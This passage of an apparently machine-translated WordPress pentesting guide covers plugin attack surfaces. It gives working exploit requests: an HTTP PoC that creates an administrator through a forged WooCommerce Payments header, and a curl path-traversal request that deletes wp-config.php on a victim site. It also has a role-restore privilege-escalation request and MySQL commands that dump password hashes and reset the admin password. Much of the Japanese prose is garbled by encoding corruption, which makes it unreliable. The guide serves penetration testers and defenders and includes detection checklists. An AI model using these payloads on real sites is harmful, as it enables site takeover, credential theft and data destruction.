- Metasploit framework ã¯ã“ã®è„†å¼±æ€§ç”¨ã® exploit ã‚’æä¾›ã—ã¦ã„ã¾ã™ã€‚é©åˆ‡ãªãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’ãƒ­ãƒ¼ãƒ‰ã—ã€ç‰¹å®šã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ã§ meterpreter ã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’ç¢ºç«‹ã—ã€ã‚µã‚¤ãƒˆã¸ã®ä¸æ­£ã‚¢ã‚¯ã‚»ã‚¹ãŒå¯èƒ½ã«ãªã‚Šã¾ã™ã€‚
- ã“ã‚Œã¯ WordPress ã‚µã‚¤ãƒˆã‚’æ‚ªç”¨ã™ã‚‹å¤šãã®æ–¹æ³•ã®ã†ã¡ã®ä¸€ä¾‹ã«éãã¾ã›ã‚“ã€‚

ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã«ã¯ã€ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã®ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã¨æœ‰åŠ¹åŒ–ã®æ‰‹é †ã‚’ç¤ºã™ WordPress ãƒ€ãƒƒã‚·ãƒ¥ãƒœãƒ¼ãƒ‰ã®è¦–è¦šçš„ãªè£œåŠ©ãŒå«ã¾ã‚Œã¦ã„ã¾ã™ã€‚ãŸã ã—ã€ã“ã®ã‚ˆã†ãªè„†å¼±æ€§ã‚’æ‚ªç”¨ã™ã‚‹ã“ã¨ã¯ã€é©åˆ‡ãªè¨±å¯ãªã—ã«ã¯é•æ³•ã§ã‚ã‚Šéå€«ç†çš„ã§ã‚ã‚‹ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚ã“ã®æƒ…å ±ã¯è²¬ä»»ã‚’æŒã£ã¦ã€æ˜ç¢ºãªè¨±å¯ã®ã‚ã‚‹ãƒšãƒãƒˆãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ãƒ†ã‚¹ãƒˆãªã©ã®åˆæ³•çš„ãªæ–‡è„ˆã§ã®ã¿ä½¿ç”¨ã—ã¦ãã ã•ã„ã€‚

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## From XSS to RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ ã¯ WordPress ã® **Cross-Site Scripting (XSS)** è„†å¼±æ€§ã‚’ **Remote Code Execution (RCE)** ã‚„ä»–ã®é‡å¤§ãªè„†å¼±æ€§ã«ã‚¨ã‚¹ã‚«ãƒ¬ãƒ¼ãƒˆã•ã›ã‚‹ãŸã‚ã«è¨­è¨ˆã•ã‚ŒãŸã‚¹ã‚¯ãƒªãƒ—ãƒˆã§ã™ã€‚è©³ç´°ã¯ [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html) ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚Wordpress Versions 6.X.X, 5.X.X and 4.X.X ã‚’ã‚µãƒãƒ¼ãƒˆã—ã€ä»¥ä¸‹ã‚’å¯èƒ½ã«ã—ã¾ã™:
- _**Privilege Escalation:**_ WordPress ã«ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ä½œæˆã—ã¾ã™ã€‚
- _**(RCE) Custom Plugin (backdoor) Upload:**_ ã‚«ã‚¹ã‚¿ãƒ ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ï¼ˆãƒãƒƒã‚¯ãƒ‰ã‚¢ï¼‰ã‚’ WordPress ã«ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã—ã¾ã™ã€‚
- _**(RCE) Built-In Plugin Edit:**_ WordPress å†…è”µã®ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã‚’ç·¨é›†ã—ã¾ã™ã€‚
- _**(RCE) Built-In Theme Edit:**_ WordPress ã®å†…è”µãƒ†ãƒ¼ãƒã‚’ç·¨é›†ã—ã¾ã™ã€‚
- _**(Custom) Custom Exploits:**_ ã‚µãƒ¼ãƒ‰ãƒ‘ãƒ¼ãƒ†ã‚£è£½ WordPress ãƒ—ãƒ©ã‚°ã‚¤ãƒ³/ãƒ†ãƒ¼ãƒå‘ã‘ã®ã‚«ã‚¹ã‚¿ãƒ ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã€‚

## Post Exploitation

ãƒ¦ãƒ¼ã‚¶ãƒ¼åã¨ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’æŠ½å‡ºã™ã‚‹:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
admin password ã‚’å¤‰æ›´ã™ã‚‹:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ Pentest

### æ”»æ’ƒå¯¾è±¡

Wordpressãƒ—ãƒ©ã‚°ã‚¤ãƒ³ãŒã©ã®ã‚ˆã†ã«æ©Ÿèƒ½ã‚’å…¬é–‹ã™ã‚‹ã‹ã‚’çŸ¥ã‚‹ã“ã¨ã¯ã€ãã®æ©Ÿèƒ½ã®è„†å¼±æ€§ã‚’ç™ºè¦‹ã™ã‚‹ãŸã‚ã«é‡è¦ã§ã™ã€‚ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ãŒæ©Ÿèƒ½ã‚’å…¬é–‹ã™ã‚‹æ–¹æ³•ã¯ä»¥ä¸‹ã®ç®‡æ¡æ›¸ãã§ç¢ºèªã§ãã€è„†å¼±ãªãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã®ã„ãã¤ã‹ã®ä¾‹ã¯[**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/)ã«ã‚ã‚Šã¾ã™ã€‚

- **`wp_ajax`**

ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ãŒé–¢æ•°ã‚’ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«å…¬é–‹ã™ã‚‹æ–¹æ³•ã®ä¸€ã¤ã¯ã€AJAXãƒãƒ³ãƒ‰ãƒ©ã‚’ä»‹ã™ã‚‹ã“ã¨ã§ã™ã€‚ã“ã‚Œã‚‰ã¯ãƒ­ã‚¸ãƒƒã‚¯ã€èªå¯ã€ã¾ãŸã¯èªè¨¼ã®ãƒã‚°ã‚’å«ã‚€å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ã•ã‚‰ã«ã€ã“ã‚Œã‚‰ã®é–¢æ•°ãŒèªè¨¼ã¨èªå¯ã®ä¸¡æ–¹ã‚’ã€Wordpressã®nonceã®å­˜åœ¨ã«åŸºã¥ã‹ã›ã‚‹ã“ã¨ãŒã‹ãªã‚Šé »ç¹ã«ã‚ã‚Šã€ãã®nonceã¯**Wordpressã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã«èªè¨¼ã•ã‚Œã¦ã„ã‚‹ä»»æ„ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒæŒã£ã¦ã„ã‚‹å¯èƒ½æ€§ãŒã‚ã‚‹**ï¼ˆãƒ­ãƒ¼ãƒ«ã«é–¢ä¿‚ãªãï¼‰ã€‚

ãƒ—ãƒ©ã‚°ã‚¤ãƒ³å†…ã®é–¢æ•°ã‚’å…¬é–‹ã™ã‚‹ãŸã‚ã«ä½¿ã‚ã‚Œã‚‹é–¢æ•°ã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™ï¼š
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**`nopriv` ã‚’ä½¿ã†ã¨ã€ãã®ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã¯ã©ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‹ã‚‰ã§ã‚‚ã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½ã«ãªã‚Šã¾ã™ï¼ˆèªè¨¼ã•ã‚Œã¦ã„ãªã„ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚‚å«ã‚€ï¼‰ã€‚**

> [!CAUTION]
> ã•ã‚‰ã«ã€é–¢æ•°ãŒ `wp_verify_nonce` ã§ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®èªå¯ã ã‘ã‚’ç¢ºèªã—ã¦ã„ã‚‹å ´åˆã€ã“ã®é–¢æ•°ã¯ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒãƒ­ã‚°ã‚¤ãƒ³ã—ã¦ã„ã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã™ã‚‹ã ã‘ã§ã€é€šå¸¸ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ­ãƒ¼ãƒ«ï¼ˆæ¨©é™ï¼‰ã¾ã§ã¯ç¢ºèªã—ã¾ã›ã‚“ã€‚ã—ãŸãŒã£ã¦ã€æ¨©é™ã®ä½ã„ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒé«˜æ¨©é™ã®æ“ä½œã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

- **REST API**

It's also possible to expose functions from wordpress registering a rest AP using the `register_rest_route` function:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
The `permission_callback` ã¯ã€ç‰¹å®šã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒ API ãƒ¡ã‚½ãƒƒãƒ‰ã‚’å‘¼ã³å‡ºã™æ¨©é™ã‚’æŒã£ã¦ã„ã‚‹ã‹ã‚’ãƒã‚§ãƒƒã‚¯ã™ã‚‹ã‚³ãƒ¼ãƒ«ãƒãƒƒã‚¯é–¢æ•°ã§ã™ã€‚

**çµ„ã¿è¾¼ã¿ã® `__return_true` é–¢æ•°ãŒä½¿ã‚ã‚Œã¦ã„ã‚‹å ´åˆã€ãƒ¦ãƒ¼ã‚¶ãƒ¼æ¨©é™ãƒã‚§ãƒƒã‚¯ã‚’å˜ã«ã‚¹ã‚­ãƒƒãƒ—ã—ã¾ã™ã€‚**

- **Direct access to the php file**

ã‚‚ã¡ã‚ã‚“ã€Wordpress ã¯ PHP ã‚’ä½¿ç”¨ã—ã¦ãŠã‚Šã€plugin å†…ã®ãƒ•ã‚¡ã‚¤ãƒ«ã¯ Web ã‹ã‚‰ç›´æ¥ã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½ã§ã™ã€‚ãã®ãŸã‚ã€plugin ãŒãƒ•ã‚¡ã‚¤ãƒ«ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã ã‘ã§èµ·å‹•ã™ã‚‹è„†å¼±ãªæ©Ÿèƒ½ã‚’å…¬é–‹ã—ã¦ã„ã‚‹å ´åˆã€ä»»æ„ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ã‚ˆã£ã¦æ‚ªç”¨ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

### Trusted-header REST impersonation (WooCommerce Payments â‰¤ 5.6.1)

ä¸€éƒ¨ã® plugin ã¯å†…éƒ¨é€£æºã‚„ reverse proxy ã®ãŸã‚ã« â€œtrusted headerâ€ ã®ã‚·ãƒ§ãƒ¼ãƒˆã‚«ãƒƒãƒˆã‚’å®Ÿè£…ã—ã€ãã® header ã‚’ REST ãƒªã‚¯ã‚¨ã‚¹ãƒˆã®ç¾åœ¨ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã‚’è¨­å®šã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã—ã¾ã™ã€‚ã‚‚ã—ãã® header ãŒä¸Šæµã®ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã«ã‚ˆã£ã¦ãƒªã‚¯ã‚¨ã‚¹ãƒˆã«å¯¾ã—ã¦æš—å·å­¦çš„ã«çµã³ä»˜ã‘ã‚‰ã‚Œã¦ã„ãªã„å ´åˆã€æ”»æ’ƒè€…ã¯ãã‚Œã‚’å½è£…ã—ã¦ç®¡ç†è€…ã¨ã—ã¦ç‰¹æ¨©ã®ã‚ã‚‹ REST ãƒ«ãƒ¼ãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã™ã€‚

- Impact: æœªèªè¨¼ã® privilege escalation to admin â€” core users REST route ã‚’ä»‹ã—ã¦æ–°ã—ã„ administrator ã‚’ä½œæˆã™ã‚‹ã“ã¨ã§å®Ÿè¡Œã•ã‚Œã¾ã™ã€‚
- Example header: `X-Wcpay-Platform-Checkout-User: 1`ï¼ˆuser ID 1 ã‚’å¼·åˆ¶ã€é€šå¸¸ã¯æœ€åˆã® administrator ã‚¢ã‚«ã‚¦ãƒ³ãƒˆï¼‰
- Exploited route: `POST /wp-json/wp/v2/users` with an elevated role array

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
Why it works

- ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã¯ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆåˆ¶å¾¡ã®ãƒ˜ãƒƒãƒ€ã‚’èªè¨¼çŠ¶æ…‹ã«ãƒãƒƒãƒ”ãƒ³ã‚°ã—ã€æ¨©é™ãƒã‚§ãƒƒã‚¯ã‚’ã‚¹ã‚­ãƒƒãƒ—ã—ã¾ã™ã€‚
- WordPress core ã¯ã“ã®ãƒ«ãƒ¼ãƒˆã« `create_users` capability ã‚’æœŸå¾…ã—ã¾ã™ï¼›ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã®ãƒãƒƒã‚¯ã¯ãƒ˜ãƒƒãƒ€ã‹ã‚‰ç›´æ¥ current user ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã‚’è¨­å®šã—ã¦ãã‚Œã‚’ãƒã‚¤ãƒ‘ã‚¹ã—ã¾ã™ã€‚

Expected success indicators

- ä½œæˆã•ã‚ŒãŸãƒ¦ãƒ¼ã‚¶ã‚’è¨˜è¿°ã—ãŸ JSON ãƒœãƒ‡ã‚£ä»˜ãã§ HTTP 201 ã‚’è¿”ã™ã€‚
- æ–°ã—ã„ç®¡ç†è€…ãƒ¦ãƒ¼ã‚¶ãŒ `wp-admin/users.php` ã«è¡¨ç¤ºã•ã‚Œã‚‹ã€‚

Detection checklist

- ãƒ¦ãƒ¼ã‚¶ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã‚’è¨­å®šã™ã‚‹ãŸã‚ã«ã‚«ã‚¹ã‚¿ãƒ ãƒ˜ãƒƒãƒ€ã‚’èª­ã‚€ `getallheaders()`, `$_SERVER['HTTP_...']`ã€ã¾ãŸã¯ãƒ™ãƒ³ãƒ€ãƒ¼ SDK ã‚’ grep ã™ã‚‹ï¼ˆä¾‹: `wp_set_current_user()`, `wp_set_auth_cookie()`ï¼‰ã€‚
- å …ç‰¢ãª `permission_callback` ãƒã‚§ãƒƒã‚¯ã‚’æ¬ ãã€ä»£ã‚ã‚Šã«ãƒªã‚¯ã‚¨ã‚¹ãƒˆãƒ˜ãƒƒãƒ€ã«ä¾å­˜ã—ã¦ã„ã‚‹ç‰¹æ¨©ã‚³ãƒ¼ãƒ«ãƒãƒƒã‚¯ã® REST ç™»éŒ²ã‚’ç¢ºèªã™ã‚‹ã€‚
- REST ãƒãƒ³ãƒ‰ãƒ©å†…ã§ã€ãƒ˜ãƒƒãƒ€å€¤ã®ã¿ã§ä¿è­·ã•ã‚Œã¦ã„ã‚‹ã‚³ã‚¢ã®ãƒ¦ãƒ¼ã‚¶ç®¡ç†é–¢æ•°ï¼ˆ`wp_insert_user`, `wp_create_user`ï¼‰ã®ä½¿ç”¨ã‚’æ¢ã™ã€‚

### wp_ajax_nopriv ã‚’ä»‹ã—ãŸèªè¨¼ã•ã‚Œã¦ã„ãªã„ä»»æ„ã®ãƒ•ã‚¡ã‚¤ãƒ«å‰Šé™¤ (Litho Theme <= 3.0)

WordPress ã®ãƒ†ãƒ¼ãƒã‚„ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã¯ `wp_ajax_` ã¨ `wp_ajax_nopriv_` ãƒ•ãƒƒã‚¯ã‚’é€šã˜ã¦ AJAX ãƒãƒ³ãƒ‰ãƒ©ã‚’å…¬é–‹ã™ã‚‹ã“ã¨ãŒå¤šã„ã€‚**_nopriv_** ãƒãƒªã‚¢ãƒ³ãƒˆãŒä½¿ã‚ã‚Œã‚‹ã¨ **ã‚³ãƒ¼ãƒ«ãƒãƒƒã‚¯ã¯èªè¨¼ã•ã‚Œã¦ã„ãªã„è¨ªå•è€…ã‹ã‚‰åˆ°é”å¯èƒ½** ã«ãªã‚‹ãŸã‚ã€æ©Ÿå¯†æ€§ã®é«˜ã„ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã¯è¿½åŠ ã§æ¬¡ã‚’å®Ÿè£…ã™ã‚‹å¿…è¦ãŒã‚ã‚‹ï¼š

1. **æ¨©é™ãƒã‚§ãƒƒã‚¯**ï¼ˆä¾‹ï¼š`current_user_can()` ã¾ãŸã¯å°‘ãªãã¨ã‚‚ `is_user_logged_in()`ï¼‰ã€ãŠã‚ˆã³
2. `check_ajax_referer()` / `wp_verify_nonce()` ã§æ¤œè¨¼ã•ã‚Œã‚‹ **CSRF nonce**ã€ãŠã‚ˆã³
3. **å³æ ¼ãªå…¥åŠ›ã®ã‚µãƒ‹ã‚¿ã‚¤ã‚º / æ¤œè¨¼**ã€‚

Litho multipurpose theme (< 3.1) ã¯ *Remove Font Family* æ©Ÿèƒ½ã§ã“ã‚Œã‚‰3ã¤ã®åˆ¶å¾¡ã‚’å¿˜ã‚Œã¦ãŠã‚Šã€çµæœã¨ã—ã¦æ¬¡ã®ã‚³ãƒ¼ãƒ‰ï¼ˆç°¡ç•¥åŒ–ï¼‰ã‚’å‡ºè·ã—ã¦ã„ãŸï¼š
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
ã“ã®ã‚¹ãƒ‹ãƒšãƒƒãƒˆã«ã‚ˆã£ã¦å°å…¥ã•ã‚Œã‚‹å•é¡Œ:

* **Unauthenticated access** â€“ the `wp_ajax_nopriv_` hook is registered.
* **No nonce / capability check** â€“ ä»»æ„ã®è¨ªå•è€…ãŒ endpoint ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ã€‚
* **No path sanitisation** â€“ ãƒ¦ãƒ¼ã‚¶ãƒ¼åˆ¶å¾¡ã® `fontfamily` æ–‡å­—åˆ—ãŒãƒ•ã‚£ãƒ«ã‚¿ãƒªãƒ³ã‚°ãªã—ã«ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ãƒ‘ã‚¹ã«é€£çµã•ã‚Œã€å¤å…¸çš„ãª `../../` ãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«ã‚’å¯èƒ½ã«ã—ã¦ã„ã‚‹ã€‚

#### Exploitation

æ”»æ’ƒè€…ã¯å˜ä¸€ã® HTTP POST request ã‚’é€ä¿¡ã™ã‚‹ã“ã¨ã§ã€**uploads ãƒ™ãƒ¼ã‚¹ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªä»¥ä¸‹**ï¼ˆé€šå¸¸ `<wp-root>/wp-content/uploads/`ï¼‰ã®ä»»æ„ã®ãƒ•ã‚¡ã‚¤ãƒ«ã¾ãŸã¯ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã‚’å‰Šé™¤ã§ãã‚‹:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Because `wp-config.php` lives outside *uploads*, four `../` sequences are enough on a default installation.  Deleting `wp-config.php` forces WordPress into the *installation wizard* on the next visit, enabling a full site take-over (the attacker merely supplies a new DB configuration and creates an admin user).

Other impactful targets include plugin/theme `.php` files (to break security plugins) or `.htaccess` rules.

#### æ¤œå‡ºãƒã‚§ãƒƒã‚¯ãƒªã‚¹ãƒˆ

* `add_action( 'wp_ajax_nopriv_...')` ã®ã‚³ãƒ¼ãƒ«ãƒãƒƒã‚¯ã§ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ãƒ˜ãƒ«ãƒ‘ãƒ¼ï¼ˆ`copy()`, `unlink()`, `$wp_filesystem->delete()` ãªã©ï¼‰ã‚’å‘¼ã³å‡ºã—ã¦ã„ã‚‹ã‚‚ã®ã€‚
* ã‚µãƒ‹ã‚¿ã‚¤ã‚ºã•ã‚Œã¦ã„ãªã„ãƒ¦ãƒ¼ã‚¶å…¥åŠ›ã‚’ãƒ‘ã‚¹ã«é€£çµã—ã¦ã„ã‚‹ç®‡æ‰€ï¼ˆ`$_POST`, `$_GET`, `$_REQUEST` ã‚’æ¢ã™ï¼‰ã€‚
* `check_ajax_referer()` ã‚„ `current_user_can()`/`is_user_logged_in()` ãŒå­˜åœ¨ã—ãªã„ã“ã¨ã€‚

---

### ã‚¹ãƒ†ãƒ¼ãƒ«ãƒ­ãƒ¼ãƒ«å¾©å…ƒã¨èªå¯æ¬ å¦‚ã«ã‚ˆã‚‹æ¨©é™æ˜‡æ ¼ (ASE "View Admin as Role")

å¤šãã®ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã¯ã€å…ƒã®ãƒ­ãƒ¼ãƒ«ã‚’ user meta ã«ä¿å­˜ã—ã¦å¾Œã§å¾©å…ƒã§ãã‚‹ã‚ˆã†ã«ã™ã‚‹ã€Œview as roleã€ã‚„ä¸€æ™‚çš„ãªãƒ­ãƒ¼ãƒ«åˆ‡ã‚Šæ›¿ãˆæ©Ÿèƒ½ã‚’å®Ÿè£…ã—ã¦ã„ã¾ã™ã€‚å¾©å…ƒå‡¦ç†ãŒãƒªã‚¯ã‚¨ã‚¹ãƒˆãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ï¼ˆä¾‹: `$_REQUEST['reset-for']`ï¼‰ã¨ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ãŒä¿æŒã™ã‚‹ãƒªã‚¹ãƒˆã ã‘ã«ä¾å­˜ã—ã€æ¨©é™ãƒã‚§ãƒƒã‚¯ã‚„æœ‰åŠ¹ãª nonce ã‚’ç¢ºèªã—ã¦ã„ãªã„å ´åˆã€ã“ã‚Œã¯å‚ç›´çš„ãªæ¨©é™æ˜‡æ ¼ã«ãªã‚Šã¾ã™ã€‚

å®Ÿéš›ã®ä¾‹ã¨ã—ã¦ã€Admin and Site Enhancements (ASE) ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ï¼ˆâ‰¤ 7.6.2.1ï¼‰ã§ç™ºè¦‹ã•ã‚Œã¾ã—ãŸã€‚reset ãƒ–ãƒ©ãƒ³ãƒã¯ã€ãƒ¦ãƒ¼ã‚¶åãŒå†…éƒ¨é…åˆ— `$options['viewing_admin_as_role_are']` ã«å­˜åœ¨ã™ã‚‹å ´åˆã« `reset-for=<username>` ã«åŸºã¥ã„ã¦ãƒ­ãƒ¼ãƒ«ã‚’å¾©å…ƒã—ã¾ã—ãŸãŒã€ç¾åœ¨ã®ãƒ­ãƒ¼ãƒ«ã‚’å‰Šé™¤ã—ã¦ user meta `_asenha_view_admin_as_original_roles` ã«ä¿å­˜ã•ã‚ŒãŸãƒ­ãƒ¼ãƒ«ã‚’å†è¿½åŠ ã™ã‚‹å‰ã«ã€`current_user_can()` ã®ãƒã‚§ãƒƒã‚¯ã‚‚ nonce ã®æ¤œè¨¼ã‚‚è¡Œã£ã¦ã„ã¾ã›ã‚“ã§ã—ãŸ:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
ãªãœæ‚ªç”¨å¯èƒ½ã‹

- `$_REQUEST['reset-for']` ã¨ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã®ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’ã‚µãƒ¼ãƒãƒ¼å´ã®èªå¯ãªã—ã«ä¿¡é ¼ã—ã¦ã„ã‚‹ã€‚
- ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒä»¥å‰ã«é«˜ã„ç‰¹æ¨©ã‚’ `_asenha_view_admin_as_original_roles` ã«ä¿å­˜ã—ã¦ã„ã¦æ¨©é™ãŒä¸‹ã’ã‚‰ã‚Œã¦ã„ãŸå ´åˆã€ãƒªã‚»ãƒƒãƒˆç”¨ã®ãƒ‘ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ã§ãã‚Œã‚‰ã‚’å¾©å…ƒã§ãã‚‹ã€‚
- ä¸€éƒ¨ã®å°å…¥ç’°å¢ƒã§ã¯ã€èªè¨¼æ¸ˆã¿ã®ä»»æ„ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒ `viewing_admin_as_role_are` ã«ã¾ã å­˜åœ¨ã™ã‚‹åˆ¥ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼åã®ãƒªã‚»ãƒƒãƒˆã‚’ãƒˆãƒªã‚¬ãƒ¼ã§ãã‚‹ï¼ˆèªå¯ã®ä¸å‚™ï¼‰ã€‚

æ‚ªç”¨ï¼ˆä¾‹ï¼‰
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
è„†å¼±ãªãƒ“ãƒ«ãƒ‰ã§ã¯ã“ã‚ŒãŒç¾åœ¨ã®ãƒ­ãƒ¼ãƒ«ã‚’å‰Šé™¤ã—ã€ä¿å­˜ã•ã‚ŒãŸå…ƒã®ãƒ­ãƒ¼ãƒ«ï¼ˆä¾‹ï¼š`administrator`ï¼‰ã‚’å†è¿½åŠ ã™ã‚‹ãŸã‚ã€å®Ÿè³ªçš„ã«æ¨©é™ãŒæ˜‡æ ¼ã—ã¾ã™ã€‚

Detection checklist

- ãƒ¦ãƒ¼ã‚¶ãƒ¼ãƒ¡ã‚¿ã«ã€Œoriginal rolesã€ã‚’ä¿æŒã™ã‚‹ã‚ˆã†ãªãƒ­ãƒ¼ãƒ«åˆ‡æ›¿æ©Ÿèƒ½ï¼ˆä¾‹ï¼š`_asenha_view_admin_as_original_roles`ï¼‰ã‚’æ¢ã™ã€‚
- ãƒªã‚»ãƒƒãƒˆ/å¾©å…ƒç”¨ã®ãƒ‘ã‚¹ã‚’ç‰¹å®šã™ã‚‹ã€‚ã“ã‚Œã‚‰ã¯æ¬¡ã®ã‚ˆã†ãªç‰¹å¾´ãŒã‚ã‚‹ï¼š
- `$_REQUEST` / `$_GET` / `$_POST` ã‹ã‚‰ãƒ¦ãƒ¼ã‚¶ãƒ¼åã‚’èª­ã¿å–ã‚‹ã€‚
- `add_role()` / `remove_role()` ã‚’ `current_user_can()` ãŠã‚ˆã³ `wp_verify_nonce()` / `check_admin_referer()` ãªã—ã§å‘¼ã³å‡ºã—ã¦ãƒ­ãƒ¼ãƒ«ã‚’å¤‰æ›´ã™ã‚‹ã€‚
- actor ã® capabilities ã§ã¯ãªããƒ—ãƒ©ã‚°ã‚¤ãƒ³ã®ã‚ªãƒ—ã‚·ãƒ§ãƒ³é…åˆ—ï¼ˆä¾‹ï¼š`viewing_admin_as_role_are`ï¼‰ã«åŸºã¥ã„ã¦èªå¯ã™ã‚‹ã€‚

---

### Unauthenticated privilege escalation via cookieâ€‘trusted user switching on public init (Service Finder â€œsf-bookingâ€)

